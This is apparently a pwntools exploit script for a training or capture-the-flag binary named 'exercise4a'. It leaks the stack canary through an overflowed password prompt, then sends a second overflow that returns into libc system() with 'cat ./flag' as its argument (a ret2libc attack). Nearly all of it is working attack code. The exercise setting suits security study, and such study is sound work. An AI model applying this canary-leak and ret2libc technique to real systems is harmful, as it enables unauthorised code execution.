#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x80493b4
b *0x80493ba
b *0x80493da
b *0x804933a
b *0x8049340
b *0x8049376
'''.format(**locals())




#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

name_address = 0x804c060
system_address = 0x2a8bf420
exit = 0x2a8b1f80

leak_canary = b'A'*19
shellcode = "20 le canary; 24 0x00000000; 40 le addr; 44 le return address; 48+16 0x90; exploit!"

r = start()
#pause()
r.recvuntil(b" your name?\n")
#r.recvline()
r.sendline(b"cat ./flag")
#r.recvline()
r.recvuntil(b" password:\n")
r.sendline(leak_canary)

leak = r.recvuntil(b"is not the password\n")
canary = leak[15+20:15+20+4]
print(canary)
print(canary.hex())

r.recvuntil(b" password:\n")
shellcode = b'A'*20 + canary + p32(0x00000000) + b'B'*12 + b'CCCC' + p32(system_address) + p32(exit) + p32(name_address) + b'\n'

r.sendline(shellcode)
print(r.recvall().decode(errors='ignore'))
# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

